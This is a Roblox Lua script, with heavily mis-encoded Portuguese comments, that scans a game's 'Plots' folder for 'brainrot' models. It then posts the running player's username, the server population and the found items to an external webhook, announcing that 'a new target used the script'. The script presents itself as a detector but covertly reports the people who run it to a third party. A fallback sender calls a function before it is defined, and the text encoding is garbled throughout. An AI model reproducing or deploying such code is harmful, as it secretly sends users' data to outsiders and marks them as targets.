-- FunÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o para verificar se um nome ÃƒÆ’Ã‚Â© um brainrot vÃƒÆ’Ã‚Â¡lido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- FunÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o para procurar brainrots na workspace
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs especÃƒÆ’Ã‚Â­ficos
    for _, id in ipairs(TARGET_IDS) do
        local model = Workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Remover duplicatas
    local uniqueBrainrots = {}
    for _, brainrot in ipairs(foundBrainrots) do
        local alreadyExists = false
        for _, existing in ipairs(uniqueBrainrots) do
            if existing == brainrot then
                alreadyExists = true
                break
            end
        end
        if not alreadyExists then
            table.insert(uniqueBrainrots, brainrot)
        end
    end
    
    return uniqueBrainrots
end

-- Nova funÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o para enviar webhook usando RequestAsync (mais seguro)
local function sendWebhook(brainrots)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local player = Players.LocalPlayer
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    
    -- Criar lista de brainrots formatada
    local brainrotsList = ""
    if #brainrots > 0 then
        for i, brainrot in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¢ " .. brainrot .. "\n"
            if i >= 40 then -- Limite de 40 brainrots
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    -- Criar payload do webhook
    local payload = {
        content = "@everyone @here, um novo alvo usou o script @everyone @here",
        embeds = {{
            title = "ÃƒÂ°Ã…Â¸Ã‚Â§  DETECÃƒÆ’Ã¢â‚¬Â¡ÃƒÆ’Ã†â€™O DE BRAINROTS ÃƒÂ°Ã…Â¸Ã‚Â§ ",
            color = 0xFF0000,
            fields = {
                {
                    name = "ÃƒÂ¢Ã…â€™Ã¢â‚¬Âº Data e hora de execuÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o:",
                    value = currentTime,
                    inline = false
                },
                {
                    name = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¤ Nome de usuÃƒÆ’Ã‚Â¡rio:",
                    value = playerName,
                    inline = true
                },
                {
                    name = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥ Pessoas no servidor:",
                    value = tostring(playerCount),
                    inline = true
                },
                {
                    name = "ÃƒÂ°Ã…Â¸Ã…Â½Ã¢â‚¬â„¢ÃƒÂ°Ã…Â¸Ã‚Â§  BRAINROTS DETECTADOS:",
                    value = brainrotsList,
                    inline = false
                }
            },
            author = {
                name = "NotificadorÃƒÂ°Ã…Â¸Ã‚Â§  || By: Project BRANZz || ÃƒÂ¢Ã…â€™Ã¢â‚¬Âº: " .. currentTime
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    -- MÃƒÆ’Ã‚Â©todo alternativo usando RequestAsync
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Webhook enviado com sucesso!")
        print("ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…  Brainrots detectados: " .. table.concat(brainrots, ", "))
    else
        warn("ÃƒÂ¢Ã‚ÂÃ…â€™ Erro ao enviar webhook: " .. tostring(result))
        -- Tentar mÃƒÆ’Ã‚Â©todo alternativo com game:HttpGet
        alternativeSendWebhook(payload, brainrots)
    end
end

-- MÃƒÆ’Ã‚Â©todo alternativo caso o primeiro falhe
local function alternativeSendWebhook(payload, brainrots)
    local encodedPayload = HttpService:JSONEncode(payload)
    
    -- Usar game:HttpGet como alternativa (ÃƒÆ’ s vezes funciona melhor)
    local success, result = pcall(function()
        local response = game:HttpGet(
            WEBHOOK_URL .. "?wait=true", 
            {
                method = "POST",
                headers = {
                    ["Content-Type"] = "application/json"
                },
                body = encodedPayload
            }
        )
        return response
    end)
    
    if success then
        print("ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Webhook enviado (mÃƒÆ’Ã‚Â©todo alternativo)!")
        print("ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…  Brainrots detectados: " .. table.concat(brainrots, ", "))
    else
        warn("ÃƒÂ¢Ã‚ÂÃ…â€™ Falha em todos os mÃƒÆ’Ã‚Â©todos de envio: " .. tostring(result))
        print("ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…  Brainrots detectados (nÃƒÆ’Ã‚Â£o enviados): " .. table.concat(brainrots, ", "))
    end
end

-- FunÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o para verificar se HttpService estÃƒÆ’Ã‚Â¡ habilitado
local function checkHttpService()
    if not HttpService then
        warn("ÃƒÂ¢Ã‚ÂÃ…â€™ HttpService nÃƒÆ’Ã‚Â£o disponÃƒÆ’Ã‚Â­vel")
        return false
    end
    
    local success = pcall(function()
        HttpService:GetAsync("https://httpbin.org/get")
    end)
    
    if not success then
        warn("ÃƒÂ¢Ã…Â¡ ÃƒÂ¯Ã‚Â¸Ã‚Â HttpService pode estar desabilitado")
    end
    
    return success
end

-- FunÃƒÆ’Ã‚Â§ÃƒÆ’Ã‚Â£o principal
local function main()
    -- Esperar um pouco para garantir que tudo carregou
    wait(2)
    
    print("ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â Iniciando busca por brainrots...")
    
    -- Verificar se HttpService funciona
    if not checkHttpService() then
        warn("ÃƒÂ¢Ã…Â¡ ÃƒÂ¯Ã‚Â¸Ã‚Â PossÃƒÆ’Ã‚Â­veis problemas com HttpService")
    end
    
    local detectedBrainrots = findBrainrots()
    
    if #detectedBrainrots > 0 then
        print("ÃƒÂ°Ã…Â¸Ã‚Â§  Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
    else
        print("ÃƒÂ¢Ã‚ÂÃ…â€™ Nenhum brainrot detectado")
    end
    
    -- Enviar webhook com os resultados
    print("ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¤ Enviando para webhook...")
    sendWebhook(detectedBrainrots)
end

-- Executar o script com tratamento de erro
local success, err = pcall(main)
if not success then
    warn("ÃƒÂ¢Ã‚ÂÃ…â€™ Erro ao executar script: " .. tostring(err))
end
